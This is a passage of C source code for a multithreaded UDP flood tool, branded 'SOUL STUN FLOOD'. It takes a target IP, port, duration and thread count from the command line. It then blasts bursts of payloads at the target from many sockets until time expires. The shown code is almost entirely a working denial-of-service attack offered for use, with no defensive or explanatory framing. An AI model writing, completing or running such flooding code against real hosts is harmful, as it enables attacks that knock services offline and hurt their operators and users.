#define NUM_PAYLOADS (sizeof(payloads) / sizeof(payloads[0]))

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sockets[MAX_SOCKETS_PER_THREAD];
    struct sockaddr_in server_addr;
    time_t endtime;
    
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        sockets[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockets[i] >= 0) {
            int sockbuf = 1024 * 1024;
            setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &sockbuf, sizeof(sockbuf));
        }
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    
    endtime = time(NULL) + data->time;
    long packet_count = 0;
    
    while (time(NULL) < endtime) {
        for (int burst = 0; burst < BURST_SIZE; burst++) {
            int sock_idx = (packet_count % MAX_SOCKETS_PER_THREAD);
            int payload_idx = (packet_count % NUM_PAYLOADS);
            
            if (sockets[sock_idx] >= 0) {
                sendto(sockets[sock_idx],
                       payloads[payload_idx].data,
                       payloads[payload_idx].length,
                       0,
                       (struct sockaddr *)&server_addr,
                       sizeof(server_addr));
            }
            packet_count++;
        }
        
        if (packet_count % PACKETS_BEFORE_TIME_CHECK == 0) {
            if (time(NULL) >= endtime) break;
        }
    }
    
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        if (sockets[i] >= 0) close(sockets[i]);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) usage();
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    
    if (attack_time <= 0 || thread_count <= 0 || port <= 0) {
        printf("Error: Invalid parameters\n");
        usage();
    }
    
    printf("\n[SOUL STUN FLOOD]\n");
    printf("Target: %s:%d\n", ip, port);
    printf("Time: %d seconds\n", attack_time);
    printf("Threads: %d\n\n", thread_count);
    
    pthread_t threads[thread_count];
    struct thread_data data = {ip, port, attack_time};
    
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, attack, &data);
    }
    
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\nAttack completed!\n");
    return 0;
}